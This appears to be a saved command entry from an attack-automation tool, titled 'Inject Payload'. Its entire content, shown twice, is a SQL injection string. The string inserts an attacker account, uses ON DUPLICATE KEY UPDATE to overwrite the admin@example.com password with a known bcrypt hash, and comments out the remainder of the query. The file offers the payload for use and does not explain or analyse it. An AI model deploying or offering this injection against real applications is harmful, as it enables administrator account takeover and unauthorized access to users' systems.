---
id: 21476395-2584-46c7-8eae-4c9a4421ad6e
name: Inject Payload
type: command
executor: bash
data: INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"),
  ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty"
  -- ", "bcrypt_hash_of_your_password_input");
output: null
created_at: '2023-04-06T03:56:36.647809+00:00'
updated_at: '2023-04-10T20:24:24.081873+00:00'
---

# Inject Payload

```bash
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");
```
